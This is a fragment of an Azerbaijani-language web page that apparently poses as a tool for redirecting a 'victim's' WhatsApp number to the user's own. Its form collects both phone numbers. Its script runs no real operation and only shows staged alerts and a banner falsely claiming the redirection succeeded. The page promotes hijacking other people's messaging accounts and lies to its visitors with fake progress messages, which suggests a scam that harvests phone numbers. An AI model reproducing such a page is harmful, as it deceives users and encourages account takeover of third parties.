...
<html>
 ...
 <body class='body'>
  <center>
   <div class="div1">
    ...
    <form method="post">
     ...
     <p style="color:red;font-size:14px;">Nomreniz</p>
     <input class="input" name="realnumber" placeholder="+994 xx xxx xx xx" type="text"/>
     <p style="color:red;font-size:14px;">Qurbanin nomresi</p>
     <input class="input" name="victimnumber" placeholder="+994 xx xxx xx xx" type="text"/>
     <br>
      <br>
      <p id='buttonn'></p>
    </form>
     ...
     border: none; 
     height: 40px; 
    border-radius: 5px;">Yonlendirmeye basla</button></p>
      </br>
     </br>
     <p id='kod'></p>
   </div>
  ...
  <script>
    ...
    document.getElementById("buttonn").innerHTML='<input type="submit" value="Yonlendirmeye basla" onclick="yaman();" class="button">';


    }
    function yaman(){
      window.alert("Yonlendirme basladilir!");//yamanefkar
      setTimeout(yaman1, 5000);//yamanefkar
    }
    function yaman1(){//yamanefkar
      document.getElementById("kod").innerHTML='<b style="color:green;font-size:27px;background-color: black;opacity: 18;filter: alpha(opacity=40);border:4px solid red;border-radius: 20px;height:50px;width:250px;">NOMRE WHATSAPP OLARAQ YONLENDIRILDI PROQRAMA DAXIL OLUN</b>';
      setTimeout(window.alert("Yonlendirildi , xahis edirik 60 saniye gozleyin..."),5000);
